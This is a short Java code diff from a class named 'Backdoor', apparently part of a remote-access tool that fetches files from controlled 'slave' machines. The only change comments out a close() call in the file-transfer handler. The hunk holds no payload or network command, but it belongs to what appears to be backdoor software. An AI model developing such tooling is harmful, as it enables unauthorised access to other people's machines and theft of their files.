@@ -161,7 +161,7 @@ public final class Backdoor {
 						slave.setContext(filePackage);
 						slave.send(filePackage);
 					} else {
-						filePackage.close();
+						// filePackage.close();
 						slave.removeContext(FetchFilePackage.class);
 						if (onPackage != null) {
 							onPackage.received(slave, filePackage);
